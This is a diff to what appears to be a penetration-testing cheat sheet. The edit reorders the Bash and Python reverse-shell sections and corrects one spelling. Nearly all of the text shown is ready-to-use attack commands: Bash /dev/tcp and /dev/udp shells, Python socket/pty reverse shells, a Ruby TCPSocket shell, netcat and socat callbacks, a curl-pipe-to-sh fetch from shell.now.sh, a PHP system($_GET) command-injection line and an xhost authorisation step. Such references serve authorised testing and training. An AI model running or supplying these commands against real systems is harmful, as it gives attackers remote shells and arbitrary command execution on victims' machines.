@@ -18,6 +18,34 @@ TODO: description and methodology for each section \(as needed\)
 curl https://shell.now.sh/<ip>:<port> | sh
 ```
 
+### **Bash Reverse Shells**
+
+#### **TCP:**
+
+```bash
+bash -i >& /dev/tcp/192.168.1.2/4444 0>&1
+```
+
+#### **UDP:**
+
+```bash
+sh -i >& /dev/udp/192.168.1.2/5555 0>&1
+```
+
+### Python Reverse Shells
+
+```python
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.57",8099));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+```python
+export RHOST="192.168.1.2";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+```
+
+```python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+```
+
 ### **PHP Reverse Shell**
 
 ```php
@@ -34,20 +62,6 @@ simple php command injection: `<?php system($_GET['variable_name']); ?>`
 
 ```ruby
 ruby -rsocket -e'f=TCPSocket.open("192.168.1.2",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
-```
-
-### **Bash Reverse Shells**
-
-#### **TCP:**
-
-```bash
-bash -i >& /dev/tcp/192.168.1.2/4444 0>&1
-```
-
-#### **UDP:**
-
-```bash
-sh -i >& /dev/udp/192.168.1.2/5555 0>&1
 ```
 
 ### **Telnet Reverse Shells**
@@ -74,20 +88,6 @@ rm -f /tmp/p; mknod /tmp/p p && nc 192.168.1.2 4444 0/tmp/p
 
 ```text
 socat tcp-connect:<IP>:<PORT> exec:"bash -li",pty,stderr,setsid,sigint,sane
-```
-
-### Python Reverse Shells
-
-```python
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.57",8099));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-```
-
-```python
-export RHOST="192.168.1.2";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
-```
-
-```python
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 ```
 
 ### **Golang Reverse Shell**
@@ -265,7 +265,7 @@ To catch the incoming xterm, start an X-Server \(:1 – which listens on TCP por
 Xnest :1
 ```
 
-You’ll need to authorise the target to connect to you \(command also run on your host\):
+You’ll need to authorize the target to connect to you \(command also run on your host\):
 
 ```text
 xhost +targetip
